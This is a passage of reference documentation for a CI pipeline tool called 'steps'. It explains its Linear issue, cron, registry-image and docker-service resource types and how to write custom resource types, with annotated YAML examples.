Linear's limits are per user, shared by every key that user holds: 2,500 requests an hour for a personal key, 5,000 for OAuth. A `linear-issues` check at steps' default poll is about 120 requests an hour per resource, so a daemon with many Linear resources should raise `--interval` rather than spend the budget. A request Linear throttles is sent again after the wait it names, a failure it reports inside a 200 answer fails the step with Linear's own message, and a write is sent again only when it was throttled, never after a timeout, so a comment is not posted twice.

### `linear-issues`: issues in a state as a trigger

A team's board doubles as a queue: someone moves an issue to `Todo`, and a pipeline picks it up. `linear-issues` finds every issue in a team that matches its filters, and every filter narrows:

```yaml linear=claim
resources:
  - name: ticket
    type: linear-issues
    source:
      team: ENG                        # a team key or name; required
      states: [Todo]                   # names in that team; any of them
      labels: [agent-ready]            # all must be on the issue
      project: Platform                # a name or an id
      assignee: "@me"                  # the key's own user; quoted because @ cannot start a plain YAML value
      token_env: LINEAR_API_KEY        # the default
      endpoint: https://api.linear.app/graphql # the default

  - name: board
    type: linear-update
    source:
      token_env: LINEAR_API_KEY        # the default
      endpoint: https://api.linear.app/graphql # the default

  - name: reply
    type: linear-comment
    source: {}

jobs:
  - name: draft
    plan:
      - get: ticket
        trigger: true
        version: every                 # one build per issue, and per move back into Todo
      - put: claimed
        resource: board
        inputs: [ticket]
        params:
          state: In Progress           # out of the finder's set, in Linear itself
          add_labels: [urgent]
          remove_labels: [agent-ready]
      - task: read
        inputs: [ticket]
        outputs: [notes]
        run: |
          echo "planning $(cat ticket/issue.identifier): $(cat ticket/issue.title), $(grep -c '^## Comment' ticket/issue.md) comment(s)" | tee notes/body.md
        assert:
          stdout: "planning ENG-12: Plan the cache, 2 comment(s)"
      - put: answered
        resource: reply
        inputs: [ticket, notes]
        params:
          body_file: notes/body.md     # posted on ENG-12
    assert:
      execution: [ticket, claimed, read, answered]
      outcome: succeeded
```

| `source:` field | required | meaning |
|---|---|---|
| `team` | yes | a team key (`ENG`) or name. Required because state and label names are per team in Linear, and an unscoped `Todo` matches every team's |
| `states` | no | state names in that team, any of which matches. A name the team does not have fails the check by name rather than matching nothing |
| `state_types` | no | Linear's fixed categories (`triage`, `backlog`, `unstarted`, `started`, `completed`, `canceled`), for a pipeline that does not want to name a team's custom states. Not with `states` |
| `labels` | no | label names that must all be on the issue, team or workspace labels, matched without regard to case |
| `project` | no | a project of that team, by name (matched without regard to case) or id. One the team does not have fails the check by name rather than matching nothing |
| `assignee` | no | `@me`, or a user id. Not an email: that would put a person's identifier in pipeline YAML |
| `token_env`, `endpoint` | no | as above |

The same finder by category, for a pipeline that should work with any team's idea of "not started yet":

```yaml linear=types
resources:
  - name: ticket
    type: linear-issues
    source:
      team: ENG
      state_types: [unstarted]         # whatever this team calls its not-yet-started states

jobs:
  - name: list
    plan:
      - get: ticket
      - task: show
        inputs: [ticket]
        run: cat ticket/issue.identifier
        assert:
          stdout: "ENG-12"
    assert:
      execution: [ticket, show]
      outcome: succeeded
```

**The version is `{identifier, entered_at}` when `states` or `state_types` is set, and `{identifier}` when neither is.** `entered_at` is when the issue last moved into the filter's set of states from a state outside it, read from its history in the same query. That is a deliberate departure from Concourse, whose versions name a thing and nothing about it, made for the reason [`github-issues`](#github-issues-a-labeled-issue-as-a-trigger) carries `labeled_at`: in Linear the state is the request for work. So **moving an issue out of the set and back asks for the work again**, which is how a person retries from Linear's own board without touching steps. "Out" means a state the filter does not name: under `states: [Todo, Ready]`, dragging an issue from `Todo` to `Ready` is not a new version, since it never left the set, while `Ready` to `In Progress` and back to `Todo` is. `state_types:` draws the set the same way, so moving between two `unstarted` states is no retry under `state_types: [unstarted]`. Editing the title or description, commenting, or a label edit is not a new version. The check reads the newest twenty history entries of each issue; one with more history than that since it entered the state (a label edit is an entry too), or created straight into it, uses the time it was created instead, and comes back as a new version at most once.

The check is a paginated query reported oldest first by creation, and **fails past 1,000 matching issues** rather than truncating, since a silently shortened list is a version that never builds. Narrow the source if it does.

A get writes no tree, since an issue has none, only these:

| file | what it holds |
|---|---|
| `issue.json` | the issue as Linear's API describes it: id, identifier, title, description, url, state, team, labels, project, `branchName` |
| `issue.id`, `issue.identifier`, `issue.title`, `issue.url` | one value each |
| `issue.branch` | the branch name Linear suggests, which links a pull request back to the issue through Linear's GitHub integration |
| `issue.comments.json` | every comment, oldest first, threads flattened with each comment's parent kept |
| `issue.md` | the issue to read: `# <identifier>: <title>`, its page, its description, then each comment under `## Comment, <created at>` |

`issue.md` carries the discussion because a decision recorded in a comment is part of the work. Comment authors are left out of it, so a model reading it is not handed people's names it does not need; they stay in `issue.comments.json`. Images embedded in a description stay as Linear's links, which expire within minutes, so a later step cannot open them. **A get fetches the issue as it is now**, whichever version it is handed: an issue has no commit to pin it to. The get reports the issue's `url` and `title` as [facts](#facts-what-a-get-or-put-says-about-its-version).

### `linear-comment` and `linear-update`: writing back

Both take `token_env` and `endpoint` in `source:` and nothing else, and find which issue a put is about in its inputs: the one input whose version carries an identifier, which every `linear-issues` get's does. `params.from` picks one when several do, and `params.issue` names one outright, as an identifier such as `ENG-123`, for a put with no such input; the type finds Linear's internal id itself, so a pipeline never handles one.

```yaml linear=acceptance
resources:
  - name: ticket
    type: linear-issues
    source: {team: ENG, states: [Todo], labels: [agent-ready]}

  - name: epic
    type: linear-issues
    source: {team: ENG, states: [Todo]}

  - name: reply
    type: linear-comment
    source: {}

  - name: board
    type: linear-update
    source: {}

jobs:
  - name: accept
    plan:
      - get: ticket
      - get: epic
      - task: write
        outputs: [out]
        run: echo "Shipped in 4.2" > out/body.md
      - put: on-ticket
        resource: reply
        inputs: [ticket, epic, out]
        params:
          body_file: out/body.md
          from: ticket                 # both gets carry an identifier, so say which
      - put: on-release
        resource: reply
        inputs: [out]
        params:
          body_file: out/body.md
          issue: ENG-12                # no get at all: an identifier a release named
      - put: started
        resource: board
        inputs: [ticket, epic]
        params:
          state: In Progress
          from: ticket
      - put: started-by-name
        resource: board
        params:
          state: In Progress           # already there, which succeeds: the issue is as asked for
          issue: ENG-12
    assert:
      execution: [ticket, epic, write, on-ticket, on-release, started, started-by-name]
      outcome: succeeded
```

| `linear-comment` `params:` field | meaning |
|---|---|
| `body_file` | the comment, a path in the put's inputs. An empty file is refused |
| `from`, `issue` | which issue, as above; not both |

| `linear-update` `params:` field | meaning |
|---|---|
| `state` | a state name in the issue's own team; refused by name if the team has none |
| `add_labels`, `remove_labels` | label names. **One the team and workspace do not have is refused**, not created: Linear does not create a label on use, and a typo should be a red put, not a new label |
| `from`, `issue` | as above |

A `linear-update` is one request to Linear, so a state move and a label swap land whole or not at all, and every name is looked up before anything is sent: a typo in the last label leaves the issue untouched. Moving an issue to the state it is already in, or removing a label it does not have, succeeds, because that is the issue as asked for, which a replay finds. A `linear-comment` is the opposite: nothing dedupes, and a retried put posts twice, as `github-pr-comment` does, so a pipeline that must not guards it.

**`linear-update` is the durable "done".** A finder keeps reporting an issue as long as it sits in its filter's states, and only version history stops a second build, so deleting `.steps/` would build every issue again. A `linear-update` as the job's first step moves the issue out of the set in Linear itself, the argument `skip_reacted` makes on GitHub, and shows people on the board that a pipeline has it.

The versions are `{issue, comment}` for a comment, and `{issue, state, add_labels, remove_labels}` for an update, with the sides it was not asked for left out. A put reports the comment's or issue's `url` as a fact. A get of either is refused at load, and so is a put to a `linear-issues` resource.

**Poll, and keep [`webhook`](webhooks.md) for latency.** The `webhook` type already has a `linear` provider, so a pipeline that wants seconds rather than a poll interval can have it, but the finder polls on purpose: Linear disables a webhook it could not deliver to three times, so a laptop asleep overnight would silence it until someone re-enabled it by hand, and a delivery's version is the delivery, not the issue. The check is the truth; a delivery is a hint that it is worth running now.

## The built-in `cron` type

`type: cron` mints a version when a slot of a crontab expression passes — the trigger for a nightly report, an hourly sweep, a job that should run whether or not anything else changed. Nothing is fetched: the artifact is the moment itself. A port of [govuk-pay/cron-resource](https://github.com/govuk-pay/cron-resource), kept to its rules.

```yaml
resources:
  - name: tick
    type: cron
    source:
      expression: "*/15 * * * *"   # every quarter hour
      location: America/New_York   # optional; the zone the expression is read in, UTC otherwise
      fire_immediately: true       # optional; the first-ever check mints a version instead of waiting

jobs:
  - name: sweep
    plan:
      - get: tick
        trigger: true
      - task: show
        inputs: [tick]
        run: test -s tick/epoch && test -s tick/timestamp && grep -c '"time"' tick/version.json
        assert:
          stdout: "1"      # one line holds the version; the two files before it are non-empty
    assert:
      execution: [tick, show]
      outcome: succeeded
```

| `source:` field | required | meaning |
|---|---|---|
| `expression` | yes | a crontab: five fields (`minute hour day-of-month month day-of-week`), six with seconds in front (`*/30 * * * * *`), or a descriptor (`@hourly`, `@daily`, `@weekly`) |
| `location` | no | the zone the expression is read in, an IANA name such as `Europe/London`; UTC when unset |
| `fire_immediately` | no | the first-ever check mints a version at once, instead of only when a slot fell in the last hour |

**A poll is what wakes it.** There is no timer inside the resource: `steps web` reads the clock on every `--interval` (30s unless said otherwise), and the first poll after a slot passes mints the version. So a slot fires within one poll of its time, and a seconds field is honored in the expression but cannot fire faster than the poll — `*/5 * * * * *` under a 30s interval is a version every 30s. One version per poll at most: several slots between two polls fire once, and a daemon that was stopped over the nightly slot does not run it when it comes back.

**The version is `{time}`**, the moment the check ran (RFC3339, UTC) rather than the slot it answered — `02:00:17Z` for a `0 2 * * *` polled at seventeen seconds past. That is what `epoch` means: when the job was released. A get writes three files:

| file | what it holds |
|---|---|
| `version.json` | the version, `{"time": "2026-09-25T02:00:17Z"}` |
| `timestamp` | the same moment in the resource's `location`, RFC3339 — `2026-09-24T22:00:17-04:00` |
| `epoch` | seconds since the Unix epoch, an integer |

**A first check is careful.** With nothing recorded there is no "since", so the check fires only if a slot fell in the **last hour** — a nightly pipeline set at three in the afternoon waits for two in the morning, and an every-ten-minutes one starts within its first poll. `fire_immediately: true` fires at once instead. This is a `steps web` behavior: `steps run` and `steps test` have no cursor, so every run of theirs is a first check — a get of a resource with no slot in the last hour fails as `no versions available`, which is the truth, and `fire_immediately` is how a one-shot run asks for the time regardless.

```yaml noexec=schedule
resources:
  - name: nightly
    type: cron
    source:
      expression: "0 2 * * 1-5"    # two in the morning, Monday to Friday
      location: America/New_York

jobs:
  - name: report
    plan:
      - get: nightly
        trigger: true
      - task: summarize
        inputs: [nightly]
        run: echo "report for $(cat nightly/timestamp)"
```

There is deliberately no `out:` — `put: tick` is a load error. A step that wants the current time has `date`; a version whose only meaning is "now" is not something to publish. `tags:` is refused too, as for every type that runs inside this process: there is nothing to place.

## The built-in `registry-image` type

`type: registry-image` is an image in an OCI registry: Docker Hub, ghcr.io, a cloud provider's, or one on this machine. Its check finds the digest a tag points at, its get names that digest so a later step can [run in exactly that image](infra.md#an-image-a-get-fetched), and its put pushes an image a build made. Modeled on Concourse's [registry-image resource](https://github.com/concourse/registry-image-resource), with its source and params names.

```yaml registry=private
resources:
  - name: app-image
    type: registry-image
    source:
      repository: ghcr.io/acme/app  # the image name, registry host included
      tag: latest                    # optional; latest when unset
      username: robot                # the registry login, used for check, get and put
      password_env: REGISTRY_TOKEN   # the NAME of the variable holding its password or token

jobs:
  - name: inspect
    plan:
      - get: app-image
      - task: show
        inputs: [app-image]
        run: cat app-image/tag && grep -c '^sha256:' app-image/digest
        assert:
          stdout: "latest1"
    assert:
      execution: [app-image, show]
      outcome: succeeded
```

| `source:` field | required | meaning |
|---|---|---|
| `repository` | yes | the image name without a tag or digest, as a pull would name it: `ghcr.io/acme/app`, `alpine` for Docker Hub's, `localhost:5050/tools` |
| `tag` | no | the one tag the check follows; `latest` when unset |
| `username` | with `password_env` | the login's user name. A registry that takes a token alone (ghcr.io) still wants one: any name will do |
| `password_env` | with `username` | the **name** of the variable holding the password or token, read from the resource's [`secrets:`](secrets.md) first and the daemon's environment otherwise, as a GitHub type's `token_env` is |
| `ca_certs` | no | PEM certificates trusted beside the system's, for a registry signed by a private CA |
| `insecure` | no | `true` skips TLS verification and allows plain http, login included |

**The login is the resource's and nothing else's.** It goes with the check, the get, the put, and the docker daemon's pull of a step whose `image:` names this get. steps never reads docker's `config.json`, a credential helper or a keychain, so what a pipeline can reach is what its `source:` says, on any machine. With no `username` and `password_env`, every request is anonymous: a private image needs them, and pushing almost always does. A login is never sent over plain http except to a registry on this machine (`localhost`, `127.0.0.1`, `::1`), which is also the only place a registry without TLS is reached.

**A registry with its own CA, or none.** `ca_certs:` adds certificates to the system's for this resource's requests; `insecure: true` verifies nothing and allows plain http, and is the only way a login is sent over http to a registry that is not on this machine. Both are Concourse's names. Both cover steps' own requests (check, get, put) and not the docker daemon's pull of a step's `image:`, which trusts what the daemon is configured to: its `insecure-registries`, or a certificate in its `certs.d`.

```yaml noexec=network
resources:
  - name: app-image
    type: registry-image
    source:
      repository: registry.internal.example:5000/team/app
      username: robot
      password_env: REGISTRY_TOKEN
      ca_certs:
        - |
          -----BEGIN CERTIFICATE-----
          MIIBfDCCASKgAwIBAgIULT9Pz2NfEOZsWe+onzuqU9g82A8wCgYIKoZIzj0EAwIw
          JDEiMCAGA1UEAwwZcmVnaXN0cnkuaW50ZXJuYWwuZXhhbXBsZTAeFw0yNjExMTcx
          NDI1NDdaFw0zNjExMTQxNDI1NDdaMCQxIjAgBgNVBAMMGXJlZ2lzdHJ5LmludGVy
          bmFsLmV4YW1wbGUwWTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAATqBGwE3UEOpvv7
          pzqZZp2rNoDidtGcwIV5wQSxue/7RWOC2Olkx1HHir/coPFKZJ7WHyowg5IOG6GH
          DMqDEHBQozIwMDAdBgNVHQ4EFgQUV3ljUSR109o8iwtb4tqHdU04M+IwDwYDVR0T
          AQH/BAUwAwEB/zAKBggqhkjOPQQDAgNIADBFAiEA+aWh/SabRB8U+tqhZCCaQHZ0
          dQOOQrj+RRAjf7kat7UCIGa/qVYKEMv7n6jzk38S5QiC7ncvc/2x9mYl8Iu+r+uS
          -----END CERTIFICATE-----

  - name: scratch-image
    type: registry-image
    source:
      repository: 10.0.0.5:5000/scratch # a lab registry on plain http
      insecure: true

jobs:
  - name: show
    plan:
      - get: app-image
      - get: scratch-image
```

**The version is `{digest}`**, the content the tag pointed at when the check ran. A new push to the tag is a new version; a push of the same content is not. A tag the registry does not have fails the check, naming it, rather than reading as "no versions yet", so a misspelled tag cannot hold a pipeline back in silence. A multi-platform image is one version: the digest of its index, which each machine's docker resolves to its own platform.

**A get fetches no layers unless asked.** It asks the registry that the digest is still there, then writes three files, because the image is pulled by whatever runs it, by digest:

| file | what it holds |
|---|---|
| `repository` | `source.repository` as written |
| `tag` | the tag the check followed |
| `digest` | the version's digest, `sha256:…` |
| `oci/` | only with `format: oci-layout`: the whole image as an [OCI layout](https://github.com/opencontainers/image-spec/blob/main/image-layout.md), every platform of a multi-platform one, its one entry the version's digest |

| `params:` field | required | meaning |
|---|---|---|
| `format` | no | `oci-layout` downloads the image into `oci/`, for a [build to start from](#building-on-a-tracked-base-image). Unset, nothing is downloaded |

Concourse's get downloads the image as a root filesystem by default; here the step that runs it does that, so `rootfs` (and `oci`, its single-platform tarball) are refused. `oci-layout` is Concourse's name and layout: a put of `oci/` to another repository pushes the same digest, which is how an image is mirrored.

### Pushing: `put`

A put pushes an image a build left in the put's inputs, to `source.tag` and any additional tags, and records the pushed digest as the resource's version: the same shape the check finds, so the next build that gets this resource sees what was pushed.

**Building is a task, not a resource**, as in Concourse (its oci-build-task, then a registry-image put). The task below runs BuildKit in a container of its own, so it needs no docker CLI on this machine and no daemon login, and its output is an OCI tarball the put pushes from steps itself:

```yaml registry=publish
tasks:
  - name: oci-build                    # reusable: any step named oci-build runs this
    image: moby/buildkit:v0.17.3
    privileged: true                   # BuildKit mounts its own snapshots
    caches:
      - path: buildkit                 # its layer cache, warm on the next build of this step
    run: |
      buildctl-daemonless.sh build \
        --frontend dockerfile.v0 --local context=src --local dockerfile=src \
        --export-cache type=local,dest=buildkit,mode=max --import-cache type=local,src=buildkit \
        --opt build-arg:SOURCE_DATE_EPOCH=0 \
        --output type=oci,dest=image/image.tar,rewrite-timestamp=true
      echo v1 > image/tags

resources:
  - name: app-image
    type: registry-image
    source:
      repository: ghcr.io/acme/app
      username: robot
      password_env: REGISTRY_TOKEN

jobs:
  - name: publish
    plan:
      - task: source                   # stands in for a get of the repository holding the Dockerfile
        outputs: [src]
        run: |
          printf 'FROM scratch\nCOPY hello /hello\n' > src/Dockerfile
          echo hello > src/hello
      - task: oci-build
        inputs: [src]
        outputs: [image]
      - put: app-image
        inputs: [image]
        params:
          image: image/image.tar       # what to push
          additional_tags: image/tags  # optional; a file of whitespace-separated tags it also gets
    assert:
      execution: [source, oci-build, app-image]
      outcome: succeeded
```

The put's version is the pushed digest; the next build's get of `app-image` finds it. A get later in the same plan does not: it was [pinned when the plan was built](#a-put-publishes-it-does-not-fetch), before the push.

- **The same digest, from the cache.** An unchanged Dockerfile and context reuse every cached layer and push the digest they pushed last time: no new version, nothing downstream triggers. `SOURCE_DATE_EPOCH=0` and `rewrite-timestamp=true` pin timestamps, and BuildKit's own exporter writes no provenance or SBOM attestations, but a step whose output is not deterministic (an `apt-get install`) gives a new digest when it is rebuilt cold. The cache is exported to and imported from the `caches:` directory (`type=local`); pointing BuildKit's own `--root` there keeps no layers between builds.
- **Multi-platform** is `--opt platform=linux/amd64,linux/arm64` on the build; the tarball then holds one index, pushed whole, and its digest is the version. A platform other than this machine's runs under emulation, slowly.
- **`privileged: true` is the price.** BuildKit mounts and unshares, which an unprivileged container may not; a worker that cannot give that (an `ssh://` one, which runs no containers) cannot run this task.

| `params:` field | required | meaning |
|---|---|---|
| `image` | yes | the image to push, as a path inside the put's inputs: an OCI layout directory, a tarball of one (BuildKit's `type=oci` output), or a `docker save` tarball. A layout must hold one image or one multi-platform index |
| `additional_tags` | no | a file of whitespace-separated tags the image also gets, beside `source.tag` |

Both paths are refused at load when they name an artifact the put does not list in its `inputs:`, and at run when one leads out of the build's tree.

### Building on a tracked base image

When the base image is a resource too, a new push of it is a new version: `trigger: true` on its get starts the build, and the build takes its `FROM` from the exact image that get downloaded, not from whatever the tag points at by the time BuildKit asks. The base's login is the resource's, so a private base needs nothing inside the build.

```yaml registry=rebuild
tasks:
  - name: oci-build
    image: moby/buildkit:v0.17.3
    privileged: true
    caches:
      - path: buildkit
    run: |
      buildctl-daemonless.sh build \
        --frontend dockerfile.v0 --local context=src --local dockerfile=src \
        --oci-layout base=base-image/oci \
        --opt "context:ghcr.io/acme/base=oci-layout://base@$(cat base-image/digest)" \
        --export-cache type=local,dest=buildkit,mode=max --import-cache type=local,src=buildkit \
        --opt build-arg:SOURCE_DATE_EPOCH=0 \
        --output type=oci,dest=image/image.tar,rewrite-timestamp=true

resources:
  - name: base-image
    type: registry-image
    source:
      repository: ghcr.io/acme/base
      username: robot
      password_env: REGISTRY_TOKEN

  - name: app-image
    type: registry-image
    source:
      repository: ghcr.io/acme/app
      username: robot
      password_env: REGISTRY_TOKEN

jobs:
  - name: publish
    plan:
      - get: base-image
        trigger: true                  # a new base starts a rebuild
        params:
          format: oci-layout           # download it, every platform, into base-image/oci
      - task: source                   # stands in for a get of the repository holding the Dockerfile
        outputs: [src]
        run: |
          printf 'FROM ghcr.io/acme/base\nCOPY hello /hello\n' > src/Dockerfile
          echo hello > src/hello
      - task: oci-build
        inputs: [src, base-image]
        outputs: [image]
      - put: app-image
        inputs: [image]
        params:
          image: image/image.tar
    assert:
      execution: [base-image, source, oci-build, app-image]
      outcome: succeeded
```

- **`--oci-layout base=…` and `context:<name>=oci-layout://base@<digest>`** are BuildKit's: the first names the downloaded layout, the second answers the Dockerfile's `FROM ghcr.io/acme/base` from it, so the Dockerfile stays one a plain `docker build` also builds. Concourse's oci-build-task does the same through `IMAGE_ARG_*`, which asks the Dockerfile for an `ARG`.
- **A multi-platform base** is one layout holding every platform; a build with `--opt platform=linux/amd64,linux/arm64` takes each platform's base from it.
- **The digest file pins it.** A get's `params:` are part of its cache key, and its version is the digest, so an unchanged base is the same get, and the build that follows reuses its cache.

`tags:` is refused, as for every type that runs inside this process: check, get and put are steps' own requests, made from this machine.

## The built-in `docker-service` type

`type: docker-service` keeps one long-lived container up on this machine's docker daemon, on a named network, for the steps that say `network: <that network>`: a test database a spec step reaches by name, a cache, a fake of an API. A put starts it, or leaves it alone when nothing about it changed, and returns once it answers.

```yaml noexec=docker
resources:
  - name: test-db
    type: docker-service
    source:
      container: ci-redis                    # its name, and how a step on the network reaches it
      image: redis:7-alpine@sha256:7f7d30b7fdd09467bac58198a1f166dd69789d348d4fe859cccb20e0cf287fbe
      network: ci                            # made if it is not there
      env: {REDIS_ARGS: --save 60 1}         # hashed into the version: never a credential
      volumes: {ci-redis-data: /data}        # a named volume, kept when the container is replaced
      ready: [redis-cli, ping]               # the put returns once this exits 0
      ready_timeout: 90s                     # optional; 60s when unset

jobs:
  - name: specs
    plan:
      - put: test-db
      - task: ping
        image: redis:7-alpine@sha256:7f7d30b7fdd09467bac58198a1f166dd69789d348d4fe859cccb20e0cf287fbe
        network: ci
        run: redis-cli -h ci-redis ping
```

| `source:` field | required | meaning |
|---|---|---|
| `container` | yes | the container's name; a step on the network reaches the service by it |
| `image` | yes | the image, pinned by digest: the put replaces the container only when `source:` changes, and a moving tag is not a change it can see |
| `network` | yes | the bridge network it joins, made if absent |
| `env` | no | its environment. Hashed into the version like the rest of `source:`, so never a credential |
| `volumes` | no | a named docker volume to the absolute path it is mounted at: what keeps a database's data when the container is replaced |
| `ready` | no | a command run in the container, once a second, until it exits 0; with none, the put returns once the container runs |
| `ready_timeout` | no | how long the put waits for `ready`, a Go duration; 60s when unset |

- **Replaced only when `source:` changes.** The container carries a hash of its `source:`; a put that finds the same hash running does nothing, finds it stopped starts it, and finds another replaces it, keeping its named volumes. The version is that hash, `{spec}`. **A container under that name that steps did not make is refused, not replaced**: the put and the check both fail naming it, and it is left as it was, since removing it would take its anonymous volumes with it.
- **It outlives the run.** The daemon restarts it with itself (`--restart=always`), and no sweep takes it: steps never removes one. Changing `container:` leaves the old one running.
- **A `ready` that never succeeds fails the put**, naming the command, including one that never returns: `ready_timeout` bounds each attempt too; a container that exits while it waits fails it with its last lines of output.
- **A check reports whether it runs**: the running `{spec}`, or no versions when the container is down or runs another configuration. A get writes `container` and `network` files. A cached get does not ask again, so a put, not a get, is what proves the service is up.
- **This machine's daemon only.** A network belongs to one daemon, so a step placed on a worker (`tags:`) that names a service's `network:` is refused at load, and `tags:` on the resource is refused, as for every type that runs inside this process. A put takes no `params:`.

Not executed by the docs suite: a service outlives the run by design, so running it would leave a container behind on every test run. `e2e/e2e_docker_service_test.go` runs the same shape and removes what it made.

## Writing a resource type

A resource type is three shell commands. (For a resource that is a JSON HTTP API and nothing else, there is a second way to write them — see [expression resource types](expr.md), which trades containers and binary artifacts for concurrent HTTP and no dependency on `curl`/`jq`.) Each is a [template](templating.md) and each runs `sh -c`. This one is self-contained, so it runs anywhere:

```yaml
resource_types:
  - name: greetings
    # image: alpine:3   # optional — run these in a container instead of on the host
    config:
      check: |
        printf '[{"word": "hello"}, {"word": "hola"}]'
      in: |
        echo {{ .version.word | shellquote }} > word.txt

resources:
  - name: greeting
    type: greetings
    source: {}

jobs:
  - name: speak
    plan:
      - get: greeting
      - task: shout
        inputs: [greeting]
        run: tr a-z A-Z < greeting/word.txt
        assert:
          stdout: HOLA       # check printed oldest-first, so the LATEST is "hola"
    assert:
      execution: [greeting, shout]
      outcome: succeeded
```

**An `image:` in a private registry** takes its login in `image_login:`: `username`, and `password_env`, the **name** of a variable in the daemon's environment holding the password or token (a type has no `secrets:` of its own). steps pulls the image with that login and no other, for check, in and out alike; it reads none of docker's own. A [stock Concourse image](#running-a-stock-concourse-resource-image) says the same in its `source:`.

```yaml noexec=credentials
resource_types:
  - name: release-notes
    image: ghcr.io/acme/tools:latest
    image_login:
      username: robot               # any name, for a registry that takes a token alone (ghcr.io)
      password_env: GHCR_TOKEN      # the NAME of the variable, never the token
    config:
      check: echo '[]'
      out: publish-notes --version "$(cat build/version)"

resources:
  - name: notes
    type: release-notes
    source: {}

jobs:
  - name: publish
    plan:
      - task: build
        outputs: [build]
        run: echo 1.0.0 > build/version
      - put: notes
        inputs: [build]
```

### `check` — what versions exist?

Runs when a plan is built, and on every `steps web` poll.

- **Sees**: `{{ .source }}` and `{{ .version }}` — the last version this pipeline recorded for the resource. See [the cursor](#the-check-cursor) below.
- **Must print**: a JSON **array** of version objects to stdout, **oldest first**. A version object is a flat map of strings — `{"ref": "abc123"}`, `{"number": "87"}`. The whole object identifies the version; steps never interprets the fields.
- **Empty array** means "no versions yet". Any version mode other than `every` fails the step with `no versions available`. Under `version: every` the job exits 0 having built nothing, and says which kind of nothing it was:
  - `get: <name> cannot build; no versions exist for: <names>` — an input has never had a version at all, so no set can be assembled. The named resources are what to go look at.
  - `get: <name> has no new versions; all N already taken` — the steady state: everything this check reports has been built already. Under `--force` the line says the force did not re-open them, and the run page shows the get as skipped with the same words.
  - `get: <name> returned no versions; the N step(s) after it did not run` — the check came back empty and there is no history to fall back on, so that much plan was dropped.
  - `get: <name> returned no versions; nothing was fetched` — the same, for a get *inside* a build: the rest of the plan still runs, without that artifact.

  These say a check came back empty — they cannot say *why*, so a type should still **fail loudly** (exit non-zero) when it can't answer, rather than printing nothing.
- **Exit non-zero** to fail the step.
- **Identical checks are run once.** When `steps web` polls several pipelines whose checks render to the same command, run the same way (image, `env:` names, user, network, limits), it runs that command once and hands every pipeline the answer for half a poll interval. The cursor is part of the rendered command, so pipelines that have seen different versions never share. Each pipeline still keeps its own history and triggers its own jobs; only the run is shared. A check placed on a worker with `tags:` is never shared, and neither is the one a build runs for itself, so a build someone triggers right after a push sees what exists now. Unlike Concourse's opt-in global resources, pipelines never share a version history.

```json
[{"ref": "9fceb02"}, {"ref": "d7b22a6"}]
```

#### The check cursor

`{{ .version }}` is the newest version the last successful check reported — Concourse calls it the *current version*. It exists so a check can ask its API for what it has **not seen** instead of guessing a window:

```yaml fragment
# a guess, and the only thing between you and both failure modes below
check: |
  curl -sS ... --data-urlencode 'limit=20' https://api.example.com/messages

# ask for exactly what we haven't seen
check: |
  curl -sS ... --data-urlencode since={{ index .version "ts" | default "0" | shellquote }} \
               --data-urlencode 'limit=200' https://api.example.com/messages
```

Guess too small and items scroll past during a busy period — and while [history](#version-history) means a version steps already recorded is not lost, one it never saw at all cannot be recovered by anything. Guess anything at all and a cold start sees a backlog it must not answer — it builds only the newest of what it finds.

Three things to know:

- **Spell it `{{ index .version "ts" | default "0" }}`, not `{{ .version.ts }}`.** On the first-ever check there is no cursor and `.version` is an empty map; templates render with `missingkey=error`, so the bare form fails that first poll. This is the same shape an optional `source:` field or get `params:` already uses.
- **The cursor belongs to `steps web` alone**, which both advances it and is the only thing that reads it. A `steps run` or `steps plan` renders `{{ .version }}` as an empty map even when a watcher has been polling for weeks — a manual run asks what exists, not what is new.
- **A check that ignores `.version` keeps working exactly as before.** The cursor narrows what a check *asks for*; it is not a filter steps applies to the answer, and it is not what decides which versions a job builds — that is [history](#version-history).

#### Bounding a check: `check_timeout:`

A resource may set `check_timeout:` (a Go duration such as `30s` or `5m`; default `1h`, as in Concourse) to cap how long one check of it may run. A check that outlives it is cancelled and fails like any other failed check, with an error naming the resource and the limit. A watcher polls its resources one after another, so the limit is what stops one hung check from starving every resource polled after it. Zero and negative values are load errors; omit the field for the default. It applies wherever a check runs: the poll, a refresh before a plan, and a get's own check.

```yaml
resource_types:
  - name: counter
    config:
      check: |
        printf '[{"n": "1"}]'
      in: echo {{ .version.n | shellquote }} > n.txt

resources:
  - name: ticks
    type: counter
    source: {}
    check_timeout: 30s

jobs:
  - name: build
    plan:
      - get: ticks
      - task: show
        inputs: [ticks]
        run: cat ticks/n.txt
        assert:
          stdout: "1"
    assert:
      execution: [ticks, show]
      outcome: succeeded
```

### Version history

steps remembers every version it has seen of a resource, in the order it first
saw them. That record is what a triggered job actually builds from — it does
**not** re-run `check` for the versions it was triggered for.

The reason is that a cursor-driven check cannot be asked twice. The second
answer is different, because the first answer moved the cursor: a job
re-deriving its own versions would ask "what is new since the versions I was
just handed" and correctly get nothing. A lookup is repeatable, so plan time
and run time agree without anything being passed between them.

History is also what makes a version *recoverable*. Without it, whatever
`check` returned right now would be the whole universe — a version that
scrolled out of the window while nothing was watching would be gone, and no
amount of cursor bookkeeping could bring it back.

Three things follow:

- **A resource nothing has polled has no history**, so a get against it runs
  its own `check` — every `steps run`, and every `get:` beside a triggered one.
- **A cold start does not become a backlog.** The first check of a resource
  records everything it reports, marks everything BELOW the newest as already
  taken, and triggers once on the newest — so a watcher pointed at twenty
  existing items builds the twentieth and answers none of the nineteen. One
  build, not twenty (which is what the marking is for) and not zero (which
  would leave a slowly-changing resource unbuilt indefinitely, and make
  deleting the state database re-arm that silence). `version: every` does not change this:
  the fan-out is over UNCONSUMED versions, and a cold start leaves exactly one
  unconsumed. (A job *added* to the pipeline later has no such marking, and
  its first trigger will see whatever history holds.)
- **Pruning is not free.** A version dropped from history takes its green
  record with it, so a `passed:` gate can no longer clear for it. That is
  correct — a version out of history cannot be built — but it means a limit
  set below what a slow downstream job needs will hold that job back.
- **A changed `type:` or `source:` is a different resource.** History belongs
  to a resource's type, its type's `image:`, and its `source:`, as it does in
  Concourse. When `steps run` loads, or `steps pipeline set` sets, a pipeline
  where any of them changed, that resource's history is forgotten — its versions,
  its check cursor, which versions jobs passed, and how far `version: every`
  got — so the first run after moving a resource checks the new source rather
  than fetching a version that only ever existed at the old one. Changing it
  back does not bring the old history back. A type's own commands, a
  resource's `tags:` and its `check_timeout:` are not part of it.

#### How much to remember

`defaults.version_history:` caps it per resource, keeping the newest (`0` keeps everything, as [every limit here does](attempts-timeout.md#zero-means-no-limit)):

```yaml
# The cap itself is not observable in one run — internal/store/sqlite's tests measure
